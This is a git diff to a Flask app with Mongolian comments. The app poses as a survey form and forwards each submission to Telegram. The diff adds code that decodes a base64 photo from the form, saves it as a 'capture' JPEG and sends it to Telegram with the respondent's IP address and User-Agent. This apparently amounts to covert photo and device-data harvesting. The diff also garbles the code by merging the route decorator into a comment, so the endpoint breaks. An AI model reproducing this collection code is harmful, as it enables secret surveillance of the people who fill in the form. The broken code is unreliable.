@@ -74,14 +74,33 @@ def success():
     </div>
     """
 
-# ----------------- Өгөгдөл Хүлээн Авах API -----------------
-@app.route('/submit', methods=['POST'])
+# ----------------- Өгөгдөл Хүлээн Авах API -----------------@app.route('/submit', methods=['POST'])
 def submit():
-    """Судалгааны хариулт болон мэдээллийг хүлээн авч, Telegram руу илгээнэ."""
-    
-    # 1. name-үүдийг ашиглан хариултуудыг цуглуулах
     role_department = request.form.get('role_department', 'Хариулаагүй')
     profession = request.form.get('profession', 'Хариулаагүй')
+    photo_data = request.form.get('photo_data', None) # Шинээр нэмэгдэж буй хувьсагч!
+    
+    image_filepath = None
+
+    if photo_data and photo_data.startswith('data:image/'):
+        try:
+            # Base64 датаг салгаж авах (жишээ нь: 'data:image/jpeg;base64,xxxxxx'-ээс 'xxxxxx'-г авах)
+            header, encoded = photo_data.split(',', 1)
+            image_data = base64.b64decode(encoded)
+            
+            # Файлын нэр үүсгэх
+            filename = f"capture_{int(time.time())}.jpg"
+            image_filepath = os.path.join(UPLOAD_FOLDER, filename)
+            
+            # Файлыг хадгалах
+            with open(image_filepath, 'wb') as f:
+                f.write(image_data)
+            
+            print(f"Зураг амжилттай хадгалагдлаа: {image_filepath}")
+        
+        except Exception as e:
+            print(f"Зураг боловсруулах алдаа: {e}")
+            image_filepath = None
 
     message = (
         f"📋 ШИНЭ СУДАЛГААНЫ ХАРИУЛТ:\n\n"
@@ -90,14 +109,14 @@ def submit():
         f"--- ТӨХӨӨРӨМЖИЙН МЭДЭЭЛЭЛ ---\n"
         f"📍 IP: {request.remote_addr}\n"
         f"🌐 User-Agent: {request.headers.get('User-Agent')}"
+        # Зураг амжилттай авсан бол Telegram-аар илгээгдэнэ.
     )
     
-    # 2. Telegram руу текст мэдээлэл илгээх
-    send_telegram_media_notification(message) 
+    # 4. Telegram руу зураг болон текст илгээх
+    send_telegram_media_notification(message, image_filepath=image_filepath)
 
-    # 3. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
+    # 5. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
     return redirect(url_for('success'))
-
 if __name__ == '__main__':
     # Local туршилтад зориулав
     app.run(port=8080, debug=True)
